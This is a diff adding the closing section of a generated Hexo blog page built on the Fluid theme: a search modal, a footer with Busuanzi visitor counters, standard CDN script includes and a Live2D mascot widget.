+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/tororo.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
